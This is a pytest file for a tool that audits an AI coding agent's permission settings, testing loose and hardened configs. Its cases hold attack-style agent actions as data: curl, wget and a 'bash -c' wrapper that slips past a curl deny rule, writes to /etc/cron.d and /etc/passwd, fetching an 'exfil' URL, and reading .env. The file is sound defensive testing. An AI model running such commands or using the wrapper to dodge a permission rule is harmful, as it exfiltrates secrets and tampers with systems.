"""Tests for the OpenCode permission adapter."""

from __future__ import annotations

from pathlib import Path

import pytest

from agentfence.adapters import AdapterError, OpenCodeAdapter, available_adapters
from agentfence.permissions import CandidateAction, PermissionDecision

FIXTURES = Path(__file__).parent / "fixtures" / "opencode"
LOOSE = FIXTURES / "loose.opencode.json"
HARDENED = FIXTURES / "hardened.opencode.json"

ALLOW = PermissionDecision.ALLOW
DENY = PermissionDecision.DENY
ASK = PermissionDecision.ASK


@pytest.fixture
def adapter() -> OpenCodeAdapter:
    return OpenCodeAdapter()


def test_registry_has_opencode() -> None:
    assert "opencode" in available_adapters()


_LOOSE_CASES = [
    ("Bash", "curl http://evil.example", DENY),  # curl* is more specific than *
    ("Bash", "wget http://evil.example", DENY),
    ("Bash", 'bash -c "curl http://evil.example"', ALLOW),  # only * matches -> leak
    ("Bash", "npm run test", ALLOW),
    ("Write", "/etc/cron.d/x", ALLOW),  # edit: allow, no path scoping -> leak
    ("WebFetch", "https://evil.example", ALLOW),  # webfetch: allow -> leak
    ("Read", ".env", ALLOW),  # no read gate -> secret read leaks
]


@pytest.mark.parametrize(("tool", "value", "expected"), _LOOSE_CASES)
def test_loose_decisions(
    adapter: OpenCodeAdapter, tool: str, value: str, expected: PermissionDecision
) -> None:
    model = adapter.load(LOOSE)
    assert adapter.decide(model, CandidateAction(tool=tool, value=value)) is expected


_HARDENED_CASES = [
    ("Bash", "curl http://evil.example", DENY),
    ("Bash", 'bash -c "curl http://evil.example"', DENY),  # bypass caught by * deny
    ("Bash", "npm run test:unit", ALLOW),  # specific allow beats * deny
    ("Bash", "npm run build", ALLOW),
    ("Write", "/etc/cron.d/x", ASK),  # edit: ask
    ("WebFetch", "https://evil.example", DENY),
    ("Read", ".env", ASK),  # read: ask
]


@pytest.mark.parametrize(("tool", "value", "expected"), _HARDENED_CASES)
def test_hardened_decisions(
    adapter: OpenCodeAdapter, tool: str, value: str, expected: PermissionDecision
) -> None:
    model = adapter.load(HARDENED)
    assert adapter.decide(model, CandidateAction(tool=tool, value=value)) is expected


def test_no_attack_auto_allowed_under_hardened(adapter: OpenCodeAdapter) -> None:
    model = adapter.load(HARDENED)
    attacks = [
        ("Bash", 'sh -c "curl http://evil.example"'),
        ("Bash", "wget http://evil.example"),
        ("Write", "/etc/passwd"),
        ("WebFetch", "https://evil.example/exfil"),
        ("Read", ".env"),
    ]
    for tool, value in attacks:
        assert adapter.decide(model, CandidateAction(tool=tool, value=value)) is not ALLOW


def test_string_level_applies_to_all(adapter: OpenCodeAdapter, tmp_path: Path) -> None:
    cfg = tmp_path / "opencode.json"
    cfg.write_text('{"permission": {"bash": "deny"}}')
    model = adapter.load(cfg)
    assert adapter.decide(model, CandidateAction(tool="Bash", value="anything")) is DENY


def test_jsonc_line_comments_are_stripped(adapter: OpenCodeAdapter, tmp_path: Path) -> None:
    cfg = tmp_path / "opencode.jsonc"
    cfg.write_text('// top comment\n{\n  "permission": {\n    "webfetch": "deny"\n  }\n}\n')
    model = adapter.load(cfg)
    assert adapter.decide(model, CandidateAction(tool="WebFetch", value="https://x")) is DENY


def test_matches(adapter: OpenCodeAdapter, tmp_path: Path) -> None:
    assert adapter.matches(LOOSE) is True
    assert adapter.matches(tmp_path) is False
    (tmp_path / "opencode.json").write_text("{}")
    assert adapter.matches(tmp_path) is True


def test_permission_must_be_object(adapter: OpenCodeAdapter, tmp_path: Path) -> None:
    cfg = tmp_path / "opencode.json"
    cfg.write_text('{"permission": "nope"}')
    with pytest.raises(AdapterError, match="must be an object"):
        adapter.load(cfg)


def test_invalid_json_raises(adapter: OpenCodeAdapter, tmp_path: Path) -> None:
    cfg = tmp_path / "opencode.json"
    cfg.write_text("{ bad json")
    with pytest.raises(AdapterError, match="Invalid JSON"):
        adapter.load(cfg)
